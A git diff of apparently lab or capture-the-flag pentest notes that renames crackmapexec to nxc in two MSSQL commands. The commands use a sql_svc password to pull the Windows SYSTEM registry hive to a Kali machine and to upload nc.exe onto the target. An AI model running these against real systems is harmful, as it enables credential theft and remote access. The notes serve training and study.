@@ -81,6 +81,6 @@ Security Implications: Generally considered more secure as it leverages the secu
 
 ### MSSQL Upload and Download Files
 ```
-proxychains4 -f /etc/proxychains4.conf crackmapexec mssql 10.10.133.148 -u sql_svc -p Dolphin1 --get-file C:\\windows.old\\Windows\\System32\\SYSTEM /home/kali/Desktop/SYSTEM
-proxychains4 -f /etc/proxychains4.conf crackmapexec mssql 10.10.133.148 -u sql_svc -p Dolphin1 --put-file nc.exe C:\\Users\\Public\\nc.exe
+proxychains4 -f /etc/proxychains4.conf crackmapexec(nxc) mssql 10.10.133.148 -u sql_svc -p Dolphin1 --get-file C:\\windows.old\\Windows\\System32\\SYSTEM /home/kali/Desktop/SYSTEM
+proxychains4 -f /etc/proxychains4.conf crackmapexec(nxc) mssql 10.10.133.148 -u sql_svc -p Dolphin1 --put-file nc.exe C:\\Users\\Public\\nc.exe
 ```
